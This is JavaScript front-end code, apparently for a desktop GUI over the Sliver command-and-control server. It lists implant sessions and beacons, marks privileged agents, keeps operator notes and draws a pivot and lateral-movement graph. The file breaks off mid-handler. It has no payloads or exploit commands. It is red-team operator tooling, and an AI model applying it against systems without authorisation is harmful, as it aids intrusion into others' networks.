const App = () => window.go.main.App;
let selectedConfigPath = null, pollTimer = null, activeCtxAgent = null;
let lastConfigPath = null, reconnectTimer = null, reconnecting = false;
let teamserverLabel = 'teamserver';
let allSessions = [], allBeacons = [];
let pivotTree = [];                  // pivot topology from GetPivotGraph RPC
// Graph interaction state (persists across refreshes).
const graphPos = {};                 // agent id -> {x,y} in graph coords
const graphDrag = {};                // agent id -> {x,y} dragged position override
let graphEdges = [];                 // current edge list [{from,to}] for live drag redraws
let graphView = { tx: 0, ty: 0, scale: 1 };
let graphCenter = null;
const openTabs = {};
const eventLog = [];
const EVENT_MAX = 500;
const notesMap = {};          // agent id -> operator notes (in-memory, cleared on disconnect)
const integrityMap = {};      // agent id -> real integrity level from getprivs (System/High/Medium/Low)
let activeInteractId = null;  // currently focused agent tab

// ── Persistence ─────────────────────────────────────────────────────────────
// Operator notes, measured integrity, and graph layout survive disconnects and
// app restarts, scoped per teamserver, in localStorage. (Previously in-memory
// only, so they were lost on every reconnect.)
let persistKey = null;        // set once we know which teamserver we're on
let saveTimer = null;
function persistScope(teamserver) { persistKey = 'sliver-gui:' + (teamserver || 'default'); }
function saveState() {
  if (!persistKey) return;
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      localStorage.setItem(persistKey, JSON.stringify({
        notes: notesMap, integrity: integrityMap, graph: graphPos, v: 1,
      }));
    } catch (e) { /* quota/private-mode: state stays in-memory only */ }
  }, 300);
}
function loadState() {
  if (!persistKey) return;
  let data;
  try { data = JSON.parse(localStorage.getItem(persistKey) || '{}'); } catch (e) { return; }
  if (!data || typeof data !== 'object') return;
  Object.assign(notesMap, data.notes || {});
  Object.assign(integrityMap, data.integrity || {});
  Object.assign(graphPos, data.graph || {});
}

// ── Utils ──────────────────────────────────────────────────────────────────
function esc(s) { return s == null ? '' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function toast(type, msg, dur=3000) {
  const t = document.createElement('div'); t.className = `toast ${type}`; t.textContent = msg;
  document.getElementById('toasts').appendChild(t);
  setTimeout(() => t.remove(), dur);
}

// uiConfirm / uiPrompt — in-app replacements for the browser's native
// confirm()/prompt(). Wails' macOS WebView (WKWebView) does not implement the
// JS dialog panels, so native confirm() returns false and prompt() returns null
// without ever showing a dialog — silently killing any action guarded by them
// (Kill agent, Delete build, Rename session). These are pure-DOM and work on
// every platform. Both return a Promise.
function uiDialog({ title, message, input, placeholder, okLabel = 'OK', danger = false }) {
  return new Promise(resolve => {
    const ov = document.createElement('div');
    ov.style.cssText = 'position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.5)';
    const inputHtml = input
      ? `<input id="ui-dlg-input" type="text" value="${(placeholder || '').replace(/"/g, '&quot;')}" style="width:100%;box-sizing:border-box;margin-top:10px;padding:7px 9px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:13px">`
      : '';
    ov.innerHTML = `<div style="min-width:300px;max-width:440px;background:var(--panel,var(--bg));border:1px solid var(--border);border-radius:8px;padding:18px 18px 14px;box-shadow:0 8px 30px rgba(0,0,0,.4)">
      ${title ? `<div style="font-weight:600;font-size:13.5px;margin-bottom:6px">${title}</div>` : ''}
      <div style="font-size:13px;color:var(--muted)">${message}</div>${inputHtml}
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px">
        <button id="ui-dlg-cancel" class="btn small">Cancel</button>
        <button id="ui-dlg-ok" class="btn small${danger ? ' danger' : ''}">${okLabel}</button>
      </div></div>`;
    document.body.appendChild(ov);
    const inp = ov.querySelector('#ui-dlg-input');
    if (inp) { inp.focus(); inp.select(); }
    const done = val => { ov.remove(); document.removeEventListener('keydown', onKey); resolve(val); };
    const onOk = () => done(input ? (inp.value || '') : true);
    const onCancel = () => done(input ? null : false);
    function onKey(e) {
      if (e.key === 'Escape') onCancel();
      else if (e.key === 'Enter') onOk();
    }
    ov.querySelector('#ui-dlg-ok').addEventListener('click', onOk);
    ov.querySelector('#ui-dlg-cancel').addEventListener('click', onCancel);
    ov.addEventListener('click', e => { if (e.target === ov) onCancel(); });
    document.addEventListener('keydown', onKey);
  });
}
function uiConfirm(message, opts = {}) { return uiDialog({ message, ...opts }); }
function uiPrompt(message, defaultValue = '', opts = {}) { return uiDialog({ message, input: true, placeholder: defaultValue, okLabel: 'OK', ...opts }); }

function isPrivileged(obj) {
  // If we've actually queried integrity for this agent, trust that over the guess.
  const lvl = (integrityMap[obj.id] || '').toLowerCase();
  if (lvl) return lvl.includes('system') || lvl.includes('high');
  const u = (obj.username || '').trim().toLowerCase();
  if (!u) return false;
  // Fallback heuristic: machine account (HOST$) = SYSTEM; NT AUTHORITY\*/admin/root.
  if (u.endsWith('$')) return true;
  return ['nt authority', 'system', 'administrator', 'admin', 'root'].some(k => u.includes(k));
}
// integrityLabel returns a short label for a node when its integrity is known.
function integrityLabel(obj) {
  const lvl = integrityMap[obj.id];
  if (!lvl) return '';
  if ((obj.username || '').trim().endsWith('$') || (obj.username || '').toLowerCase().includes('system')) return 'SYSTEM';
  return lvl.toUpperCase();
}
function osLabel(os) {
  const o = (os||'').toLowerCase();
  if (o.includes('windows')) return 'W';
  if (o.includes('linux')) return 'L';
  if (o.includes('darwin')) return 'M';
  return '?';
}
// osIconHref returns the PNG icon path for an OS + privilege level (icons live in
// frontend/dist/icons). HIGH = privileged, NORMAL = user. Falls back to Windows.
function osIconHref(os, priv, dead) {
  const o = (os||'').toLowerCase();
  const lvl = dead ? 'DEAD' : (priv ? 'HIGH' : 'NORMAL');   // DEAD > HIGH > NORMAL
  if (o.includes('linux')) return `./icons/LINUX-${lvl}.png`;
  // macOS / container / unknown — no dedicated icon; use the Windows art.
  return `./icons/WIN-${lvl}.png`;
}
// shortUser strips a leading DOMAIN\ or HOST\ from a Windows username.
function shortUser(u) { u = u || '?'; const i = u.lastIndexOf('\\'); return i >= 0 ? u.slice(i+1) : u; }
// fmtDur renders a sliver interval/jitter (nanoseconds) as seconds.
function fmtDur(ns) { const n = Number(ns) || 0; return n > 1e6 ? `${Math.round(n/1e9)}s` : `${n}s`; }

// ── Connect ────────────────────────────────────────────────────────────────
document.getElementById('pick-config-btn').addEventListener('click', async () => {
  const path = await App().PickConfigFile().catch(() => null);
  if (path) { selectedConfigPath = path; document.getElementById('config-path').textContent = path; document.getElementById('connect-btn').disabled = false; }
});
document.getElementById('manual-cfg-path').addEventListener('input', function() { var p = this.value.trim(); if (p) { selectedConfigPath = p; document.getElementById('config-path').textContent = p; document.getElementById('connect-btn').disabled = false; } });
document.getElementById('connect-btn').addEventListener('click', async () => {
  const btn = document.getElementById('connect-btn');
  btn.disabled = true; btn.textContent = 'Connecting...';
  const r = await App().Connect(selectedConfigPath).catch(e => ({ error: String(e) }));
  if (r.error) { document.getElementById('connect-error').textContent = r.error; btn.disabled = false; btn.textContent = 'Connect'; return; }
  lastConfigPath = selectedConfigPath;
  enterApp(r);
});

async function enterApp(info) {
  document.getElementById('connect-overlay').classList.add('hidden');
  document.getElementById('app-shell').classList.remove('hidden');
  document.getElementById('operator-tag').textContent = `${info.operatorName}@${info.teamserver}`;
  teamserverLabel = info.teamserver || 'teamserver';
  persistScope(teamserverLabel);
  loadState();
  const ver = await App().GetVersion().catch(() => null);
  if (ver) document.getElementById('server-version').textContent = `v${ver.major}.${ver.minor}.${ver.patch}`;
  wireEventStream();
  pinServerConsole();     // Server console docked by default
  pinEvents();            // Event Log docked in the console by default
  pinScripts();           // Script Manager docked in the console by default
  refreshAgents();
  pollTimer = setInterval(refreshAgents, 5000);
}

document.getElementById('disconnect-btn').addEventListener('click', async () => {
  clearInterval(pollTimer);
  if (window.runtime) { window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected'); }
  await App().Disconnect();
  document.getElementById('app-shell').classList.add('hidden');
  document.getElementById('connect-overlay').classList.remove('hidden');
  document.getElementById('connect-btn').textContent = 'Connect'; document.getElementById('connect-btn').disabled = true;
  document.getElementById('config-path').textContent = '';
  document.getElementById('interact-tabs').innerHTML = '';
  document.getElementById('interact-panels').innerHTML = '<div class="empty-interact" id="empty-interact"><p>Double-click an agent to interact.</p></div>';
  for (const k in openTabs) delete openTabs[k];
  for (const k in notesMap) delete notesMap[k];
  for (const k in integrityMap) delete integrityMap[k];
  // Clear transient graph state so jump lineage / drags don't leak into the next
  // engagement (persisted per-teamserver graphPos is kept).
  for (const k in jumpParentMap) delete jumpParentMap[k];
  for (const k in graphDrag) delete graphDrag[k];
  pivotTree = [];
  activeInteractId = null;
  allSessions = []; allBeacons = [];
  selectedConfigPath = null; cancelReconnect();
});

// ── Event Stream ───────────────────────────────────────────────────────────
function wireEventStream() {
  if (!window.runtime) return;
  window.runtime.EventsOff('sliver:event'); window.runtime.EventsOff('sliver:disconnected');
  window.runtime.EventsOn('sliver:disconnected', (reason) => onDisconnected(reason));
  window.runtime.EventsOn('sliver:event', (ev) => {
    logEvent(ev);
    if (ev.type && ev.type.includes('session')) refreshAgents();
    if (ev.type && ev.type.includes('beacon')) refreshAgents();
    if (ev.type === 'session-connected' || ev.type === 'session-opened') toast('ok', `New session: ${ev.session?.hostname||''}`);
    if (ev.type === 'beacon-registered') toast('info', `Beacon registered: ${ev.session?.hostname||ev.data||''}`);
  });
}
function logEvent(ev) {
  eventLog.unshift({ time: new Date().toLocaleTimeString(), type: ev.type||'unknown', detail: ev.session ? `${ev.session.hostname} (${ev.session.os}) ${ev.session.username||''}` : (ev.data||'') });
  if (eventLog.length > EVENT_MAX) eventLog.length = EVENT_MAX;
  renderEventsList(); // live-update any open/pinned event views
}
function eventColor(type) {
  const t = type || '';
  if (t.includes('session')) return 'var(--ok)';
  if (t.includes('beacon')) return 'var(--info)';
  if (t.includes('job')) return 'var(--warn)';
  if (t.includes('operator')) return 'var(--accent)';
  return 'var(--muted)';
}
function renderEventsList() {
  const targets = document.querySelectorAll('[data-events-list]');
  if (!targets.length) return;
  const rows = eventLog.length
    ? eventLog.map(e => `<div class="event-entry"><span class="event-time">${esc(e.time)}</span><span class="event-type" style="color:${eventColor(e.type)};font-weight:bold">${esc(e.type)}</span><span class="event-detail">${esc(e.detail)}</span></div>`).join('')
    : '<div style="padding:10px;color:var(--muted)">No events yet.</div>';
  targets.forEach(el => el.innerHTML = rows);
}

// ── Refresh all agents ─────────────────────────────────────────────────────
async function refreshAgents() {
  allSessions = await App().ListSessions().catch(() => []) || [];
  allBeacons = await App().ListBeacons().catch(() => []) || [];
  pivotTree = await App().GetPivotGraph().catch(() => []) || [];
  document.getElementById('agent-count').textContent = `${allSessions.length} sessions | ${allBeacons.length} beacons`;
  renderTable();
  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
}
document.getElementById('refresh-all-btn').addEventListener('click', refreshAgents);

// ── Table view ─────────────────────────────────────────────────────────────
// userCell renders the user column, highlighting privileged (SYSTEM/admin/★) agents.
function userCell(o) {
  const il = integrityLabel(o);
  return isPrivileged(o)
    ? `<td class="user-priv" title="Privileged (right-click → Check Integrity for the real level)">★ ${esc(o.username)}${il ? ` [${il}]` : ''}</td>`
    : `<td>${esc(o.username)}${il ? ` <span style="color:var(--muted)">[${il}]</span>` : ''}</td>`;
}
function renderTable() {
  const body = document.getElementById('agents-body');
  body.innerHTML = '';
  const row = (o, kind) => {
    const tr = document.createElement('tr'); tr.dataset.id = o.id; tr.dataset.kind = kind;
    if (isPrivileged(o) && !o.isDead) tr.classList.add('row-priv');
    const typeCls = kind === 'session' ? 'type-session' : 'type-beacon';
    const remoteIP = o.remoteAddress ? o.remoteAddress.split(':')[0] : '-';
    tr.innerHTML = `<td class="${typeCls}">${kind.toUpperCase()}</td><td>${esc(o.name||o.id.slice(0,8))}</td><td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(remoteIP)}</td><td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${esc(o.lastCheckin)}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
    tr.addEventListener('dblclick', () => openInteract(kind, o));
    tr.addEventListener('contextmenu', e => showCtx(e, kind, o));
    body.appendChild(tr);
  };
  allSessions.forEach(s => row(s, 'session'));
  allBeacons.forEach(b => row(b, 'beacon'));
}

// ── View toggle ────────────────────────────────────────────────────────────
document.getElementById('view-table-btn').addEventListener('click', () => { document.getElementById('table-view').classList.remove('hidden'); document.getElementById('graph-view').classList.add('hidden'); document.getElementById('view-table-btn').classList.add('active'); document.getElementById('view-graph-btn').classList.remove('active'); });
document.getElementById('view-graph-btn').addEventListener('click', () => { document.getElementById('table-view').classList.add('hidden'); document.getElementById('graph-view').classList.remove('hidden'); document.getElementById('view-table-btn').classList.remove('active'); document.getElementById('view-graph-btn').classList.add('active'); renderGraph(); });
document.getElementById('graph-reset-btn').addEventListener('click', resetGraph);

// ── Graph view (premium Cobalt-Strike style) ────────────────────────────────
// jumpParentMap tracks Jump / Spawn operations performed from session console or script manager
// Format: jumpParentMap[targetHostOrIP] = { parentID, parentHost }
const jumpParentMap = {};

function recordJump(parentSessID, targetHost) {
  if (!targetHost || !parentSessID) return;
  const parentTab = openTabs[parentSessID];
  const parentHost = (parentTab && parentTab.obj && parentTab.obj.hostname) ? parentTab.obj.hostname : '';
  const record = { parentID: parentSessID, parentHost: parentHost };
  jumpParentMap[targetHost] = record;
  const cleanHost = targetHost.startsWith('[')
    ? targetHost.substring(1, targetHost.indexOf(']'))
    : targetHost.split(':')[0];
  if (cleanHost && cleanHost !== targetHost) {
    jumpParentMap[cleanHost] = record;
  }
}

// buildPivotMaps flattens Sliver's pivot tree into sessionID/hostname -> parent mappings.
// Prefers sessionID-based matching to correctly handle multiple sessions on the same host.
function buildPivotMaps() {
  const parentOf   = {};  // hostname -> parent hostname
  const parentOfID = {};  // sessionID -> parent sessionID
  const walk = (nd, parentHost, parentSessID) => {
    const host   = nd.hostname || nd.name || ('peer' + nd.peerId);
    // JSON tag is "sessionId" (lowercase d) — reading nd.sessionID left this
    // undefined, breaking the reliable per-session pivot matching and forcing a
    // wrong hostname fallback (e.g. a pivot child attached to the root instead
    // of its real parent).
    const sessID = nd.sessionId || nd.sessionID || nd.id || null;
    if (parentHost)              parentOf[host]     = parentHost;
    if (sessID && parentSessID)  parentOfID[sessID] = parentSessID;
    (nd.children || []).forEach(c => walk(c, host, sessID));
  };
  (pivotTree || []).forEach(r => walk(r, null, null));
  return { parentOf, parentOfID };
}

// edgeD builds a straight edge path shortened at both ends so the arrowhead sits
// on the target node's edge (not under its icon). srcR/tgtR are the radii to inset.
function edgeD(src, tgt, srcR, tgtR) {
  const dx = tgt.x - src.x, dy = tgt.y - src.y, len = Math.hypot(dx, dy) || 1;
  const ux = dx / len, uy = dy / len;
  const ax = src.x + ux * srcR, ay = src.y + uy * srcR;
  const bx = tgt.x - ux * tgtR, by = tgt.y - uy * tgtR;
  return `M${ax.toFixed(1)} ${ay.toFixed(1)} L${bx.toFixed(1)} ${by.toFixed(1)}`;
}

// edgeColor picks the line colour from the agent it points at.
// Jump edges are orange and handled separately in renderGraph.
function edgeColor(nd) {
  if (!nd) return '#35c46b';
  if (nd.obj && nd.obj.isDead) return '#6b7280';      // dead → grey (matches legend)
  if (nd.kind === 'beacon') return '#4d9fe6';
  return isPrivileged(nd.obj) ? '#e23c4e' : '#35c46b';
}

// renderGraph draws the pivot topology: firewall on left, coloured egress/pivot edges,
// and orange bidirectional dashed lines for lateral-movement jumps.
function renderGraph() {
  const svg = document.getElementById('graph-svg');
  if (!svg) return;
  try {
    const nodes = [
      ...allSessions.map(s => ({ kind:'session', obj:s })),
      ...allBeacons.map(b  => ({ kind:'beacon',  obj:b })),
    ];
    const W = svg.clientWidth || 900, H = svg.clientHeight || 460;
    svg.setAttribute('viewBox', `0 0 ${W} ${H}`);
    const fwX = 74, fwY = H / 2;

    // Build lookup maps
    const nodeByHost = {}, nodeByID = {};
    nodes.forEach(nd => {
      const h = nd.obj.hostname; if (h && !nodeByHost[h]) nodeByHost[h] = nd;
      nodeByID[nd.obj.id] = nd;
    });

    const { parentOf, parentOfID } = buildPivotMaps();
    const parentNodeId = {}, jumpEdgeSet = new Set();

    // ── Parent resolution — PIVOT is authoritative, JUMP is heuristic. ──
    // Pass 1: pivot parents from Sliver's pivot graph (session-ID; then a GENUINE
    // cross-host hostname fallback). These come straight from the teamserver and
    // define the true topology (firewall → gateway → pivoted agent).
    nodes.forEach(nd => {
      let parentId = null;
      const pByID = parentOfID[nd.obj.id];
      if (pByID && nodeByID[pByID] && pByID !== nd.obj.id) parentId = pByID;
      if (!parentId) {
        const ph = parentOf[nd.obj.hostname];
        if (ph && ph !== nd.obj.hostname) {
          const cands = nodes.filter(n => n.obj.hostname === ph && n.obj.id !== nd.obj.id);
          if (cands.length) parentId = cands[0].obj.id;
        }
      }
      if (parentId) parentNodeId[nd.obj.id] = parentId;
    });

    // wouldCycle: does linking child→parent loop back through the existing parents?
    const wouldCycle = (childId, parentId) => {
      let cur = parentId, hops = 0;
      while (cur && hops++ <= nodes.length) { if (cur === childId) return true; cur = parentNodeId[cur]; }
      return false;
    };

    // Pass 2: jump / lateral-move lineage — ONLY for agents that have no pivot
    // parent, and NEVER if it would reverse/cycle a pivot chain. This is what
    // stops a jump whose target IP collides with an existing same-host session
    // (all agents on one box share an IP) from hijacking or flipping the tree.
    nodes.forEach(nd => {
      if (parentNodeId[nd.obj.id]) return;              // pivot already owns this node
      let ipOnly = '';
      if (nd.obj.remoteAddress) {
        const raw = nd.obj.remoteAddress;
        ipOnly = raw.startsWith('[') ? raw.substring(1, raw.indexOf(']')) : raw.split(':')[0];
      }
      const entry = jumpParentMap[nd.obj.hostname] ||
                    (ipOnly ? jumpParentMap[ipOnly] : null) ||
                    jumpParentMap[nd.obj.remoteAddress];
      if (!entry) return;
      const pID   = (typeof entry === 'object') ? entry.parentID   : entry;
      const pHost = (typeof entry === 'object') ? entry.parentHost : null;
      let parentId = null;
      if (pID && pID !== nd.obj.id && nodeByID[pID] && !nodeByID[pID].obj.isDead) parentId = pID;
      else if (pHost && pHost !== nd.obj.hostname) {
        const ap = nodes.filter(n => n.obj.hostname === pHost && n.obj.id !== nd.obj.id && !n.obj.isDead);
        if (ap.length) parentId = ap[0].obj.id;
      }
      if (parentId && !wouldCycle(nd.obj.id, parentId)) {
        parentNodeId[nd.obj.id] = parentId;
        jumpEdgeSet.add(`${parentId}:${nd.obj.id}`);
      }
    });

    // Safety net: drop self-parents / parents that aren't real nodes.
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p === nd.obj.id || (p && !nodeByID[p])) delete parentNodeId[nd.obj.id];
    });

    // Rebuild the children map from the validated parent links.
    const kidsOf = {};
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p) (kidsOf[p] = kidsOf[p] || []).push(nd.obj.id);
    });
    const roots = nodes.filter(nd => !parentNodeId[nd.obj.id]).map(nd => nd.obj.id);

    // Tidy left-to-right tree: x = depth column, y = leaf order (parents centred
    // on the span of their children). rowH > node height so labels never overlap.
    const layout = {}, colW = 200, rowH = 116, topPad = 50;
    let row = 0;
    const placed = {};
    const place = (id, depth) => {
      if (placed[id]) return layout[id] ? layout[id].y : topPad + row * rowH;
      placed[id] = 1;
      const x = fwX + depth * colW;
      const kids = (kidsOf[id] || []).filter(k => !placed[k]);
      let y;
      if (!kids.length) { y = topPad + row * rowH; row++; }
      else { const ys = kids.map(k => place(k, depth + 1)); y = (Math.min(...ys) + Math.max(...ys)) / 2; }
      layout[id] = { x, y };
      return y;
    };
    roots.forEach(r => place(r, 1));
    nodes.forEach(nd => { if (!placed[nd.obj.id]) place(nd.obj.id, 1); });

    // Vertically centre the whole tree in the viewport.
    const yvals = Object.values(layout).map(p => p.y);
    if (yvals.length) {
      const mid = (Math.min(...yvals) + Math.max(...yvals)) / 2;
      const dy = H / 2 - mid;
      Object.values(layout).forEach(p => p.y += dy);
    }
    svg._layout = layout; svg._fwX = fwX; svg._fwY = fwY;
    // Priority: live drag > persisted position > computed layout.
    const posOf  = id => graphDrag[id] || graphPos[id] || layout[id] || { x: fwX + colW, y: H / 2 };
    // Icon half-width is 26px; inset the arrows well past it on BOTH ends so
    // every edge has the same clear, tidy gap before the node/firewall icon.
    const NODE_R = 46, FW_R = 48;

    // Build edge list — firewall → every root, then parent → child.
    graphEdges = [];
    roots.forEach(id => graphEdges.push({ from:'__fw__', to:id, isJump:false }));
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p) graphEdges.push({ from:p, to:nd.obj.id, isJump: jumpEdgeSet.has(`${p}:${nd.obj.id}`) });
    });

    const fwPos = { x: fwX, y: fwY };

    // SVG defs — arrowheads for green/red/blue/orange
    let html = '<defs>' +
      '<marker id="ar-green"        viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#35c46b"/></marker>' +
      '<marker id="ar-red"          viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#e23c4e"/></marker>' +
      '<marker id="ar-blue"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#4d9fe6"/></marker>' +
      '<marker id="ar-grey"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#6b7280"/></marker>' +
      '<marker id="ar-orange-end"   viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
      '<marker id="ar-orange-start" viewBox="0 0 10 10" refX="1.5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
      '</defs>';

    html += `<g id="g-root" transform="translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})">`;

    // Draw edges
    graphEdges.forEach(ed => {
      const src  = ed.from === '__fw__' ? fwPos : posOf(ed.from);
      const tgt  = posOf(ed.to);
      const srcR = ed.from === '__fw__' ? FW_R : NODE_R;
      const eid  = `ge-${ed.from}-${ed.to}`;
      if (ed.isJump) {
        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
          stroke="#f5a623" stroke-width="2.2" stroke-dasharray="9 5" fill="none"
          marker-end="url(#ar-orange-end)" marker-start="url(#ar-orange-start)" opacity="0.92"/>`;
      } else {
        const col = edgeColor(nodeByID[ed.to]);
        const mk  = col === '#4d9fe6' ? 'ar-blue' : col === '#e23c4e' ? 'ar-red' : col === '#6b7280' ? 'ar-grey' : 'ar-green';
        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
          stroke="${col}" stroke-width="2.4" fill="none" marker-end="url(#${mk})"/>`;
      }
    });

    // Firewall icon — brick wall + flame, NO text label
    html += `<g pointer-events="none" transform="translate(${fwX},${fwY})">`;
    const bw = 15, bh = 9;
    for (let r = 0; r < 5; r++) {
      const oy = -22 + r * bh, off = (r % 2) ? bw / 2 : 0;
      for (let c = -1; c < 2; c++)
        html += `<rect x="${c*bw+off-7}" y="${oy}" width="${bw-1.5}" height="${bh-1.5}" fill="#9a3b2e" stroke="#5f231b" stroke-width="0.8"/>`;
    }
    html += '<text x="-19" y="7" font-size="30" text-anchor="middle">\uD83D\uDD25</text>';
    html += '</g>';

    // Agent nodes
    nodes.forEach(nd => {
      const o    = nd.obj, p = posOf(o.id), dead = o.isDead, priv = isPrivileged(o);
      const isJumpRelated = jumpEdgeSet.size > 0 &&
        [...jumpEdgeSet].some(k => k.startsWith(o.id + ':') || k.endsWith(':' + o.id));
      html += `<g class="gnode${dead ? ' dead' : ''}" data-id="${esc(o.id)}" transform="translate(${p.x},${p.y})" style="cursor:grab">`;
      html += '<rect x="-30" y="-34" width="60" height="94" fill="transparent"/>';
      if (o.id === activeInteractId)
        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#35c46b" stroke-width="1.5" stroke-dasharray="5 4"/>';
      else if (isJumpRelated)
        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#f5a623" stroke-width="1.2" stroke-dasharray="6 4" opacity="0.65"/>';
      html += `<image href="${osIconHref(o.os, priv, dead)}" x="-26" y="-26" width="52" height="52" pointer-events="none"/>`;
      const user = shortUser(o.username) + (priv && !dead ? ' *' : '');
      const l2   = `${o.hostname || o.id.slice(0, 6)}${o.pid ? ' @ ' + o.pid : ''}`;
      const lc   = dead ? 'var(--muted)' : (priv ? 'var(--accent)' : 'var(--text)');
      html += `<text y="40" text-anchor="middle" fill="${lc}" font-size="10" font-weight="bold" font-family="var(--font)" pointer-events="none">${esc(user)}</text>`;
      html += `<text y="51" text-anchor="middle" fill="var(--muted)" font-size="8.5" font-family="var(--mono)" pointer-events="none">${esc(l2)}</text>`;
      if (dead) html += '<text y="-30" text-anchor="middle" fill="var(--muted)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">DEAD</text>';
      html += '</g>';
    });

    html += '</g>';
    svg.innerHTML = html;

    const byId = {}; nodes.forEach(nd => byId[nd.obj.id] = nd);
    svg.querySelectorAll('.gnode').forEach(el => {
      const nd = byId[el.dataset.id];
      if (nd && !nd.obj.isDead) el.addEventListener('dblclick', () => openInteract(nd.kind, nd.obj));
    });
    setupGraphInteraction(svg);
  } catch (err) { console.error('renderGraph failed:', err); }
}

// setupGraphInteraction wires node drag, canvas pan and wheel zoom.
// Guards with svg._wired so it only sets up once per SVG lifetime.
// Call svg._wired = false before renderGraph() when you need a fresh setup (e.g. resetGraph).
function setupGraphInteraction(svg) {
  if (svg._wired) return;
  svg._wired = true;
  let mode = null, dragId = null, startX = 0, startY = 0, origX = 0, origY = 0;

  const applyView = () => {
    const root = document.getElementById('g-root');
    if (root) root.setAttribute('transform', `translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})`);
  };
  const posOf = id => graphDrag[id] || graphPos[id] || (svg._layout && svg._layout[id]) || { x: (svg._fwX||74) + 200, y: svg._fwY || 0 };

  svg.addEventListener('mousedown', e => {
    const nodeEl = e.target.closest('.gnode');
    startX = e.clientX; startY = e.clientY;
    if (nodeEl) {
      mode = 'node'; dragId = nodeEl.dataset.id;
      const pp = posOf(dragId); origX = pp.x; origY = pp.y;
      nodeEl.style.cursor = 'grabbing';
    } else {
      mode = 'pan'; origX = graphView.tx; origY = graphView.ty;
      svg.style.cursor = 'grabbing';
    }
    e.preventDefault();
  });

  document.addEventListener('mousemove', e => {
    if (!mode) return;
    if (mode === 'node') {
      const dx = (e.clientX - startX)/graphView.scale, dy = (e.clientY - startY)/graphView.scale;
      const nx = origX + dx, ny = origY + dy;
      graphDrag[dragId] = { x: nx, y: ny };
      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`);
      if (g) g.setAttribute('transform', `translate(${nx},${ny})`);
      (graphEdges || []).forEach(ed => {
        if (ed.from !== dragId && ed.to !== dragId) return;
        const src = ed.from === '__fw__' ? { x: svg._fwX, y: svg._fwY } : posOf(ed.from), tgt = posOf(ed.to);
        const el = document.getElementById(`ge-${ed.from}-${ed.to}`);
        if (el) el.setAttribute('d', edgeD(src, tgt, ed.from === '__fw__' ? 48 : 46, 46));
      });
    } else if (mode === 'pan') {
      graphView.tx = origX + (e.clientX - startX);
      graphView.ty = origY + (e.clientY - startY);
      applyView();
    }
  });

  document.addEventListener('mouseup', () => {
    if (mode === 'pan') svg.style.cursor = '';
    if (mode === 'node' && dragId) {
      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`); if (g) g.style.cursor = 'grab';
      // Persist the dragged position so it survives refresh / reconnect.
      if (graphDrag[dragId]) { graphPos[dragId] = { ...graphDrag[dragId] }; saveState(); }
    }
    mode = null; dragId = null;
  });

  svg.addEventListener('wheel', e => {
    e.preventDefault();
    const rect = svg.getBoundingClientRect();
    const mx = e.clientX - rect.left, my = e.clientY - rect.top;
    const factor = e.deltaY < 0 ? 1.12 : 1/1.12;
    const ns = Math.min(3, Math.max(0.3, graphView.scale * factor));
    graphView.tx = mx - (mx - graphView.tx) * (ns/graphView.scale);
    graphView.ty = my - (my - graphView.ty) * (ns/graphView.scale);
    graphView.scale = ns;
    applyView();
  }, { passive: false });
}

// Reset the graph layout/view to its default.
// Clears all dragged positions, resets pan/zoom, and forces interaction re-init.
function resetGraph() {
  for (const k in graphPos)  delete graphPos[k];
  for (const k in graphDrag) delete graphDrag[k];
  graphView  = { tx: 0, ty: 0, scale: 1 };
  graphCenter = null;
  saveState();               // persist the cleared layout so it sticks
  // Do NOT reset svg._wired — the pan/drag/zoom listeners are delegated on the
  // svg/document and survive re-renders. Re-wiring would stack duplicate handlers.
  renderGraph();             // re-renders with cleared drags + reset pan/zoom
  toast('ok', 'Graph layout reset');
}

// ── Context menu ───────────────────────────────────────────────────────────
const ctxMenu = document.getElementById('ctx-menu');
function showCtx(e, kind, obj) {
  e.preventDefault(); activeCtxAgent = { kind, obj };
  ctxMenu.style.left = Math.min(e.clientX, window.innerWidth-160)+'px';
  ctxMenu.style.top = Math.min(e.clientY, window.innerHeight-100)+'px';
  ctxMenu.classList.remove('hidden');
}
document.addEventListener('click', () => ctxMenu.classList.add('hidden'));
document.getElementById('ctx-interact').addEventListener('click', () => { if (activeCtxAgent) openInteract(activeCtxAgent.kind, activeCtxAgent.obj); });
document.getElementById('ctx-integrity').addEventListener('click', async () => {
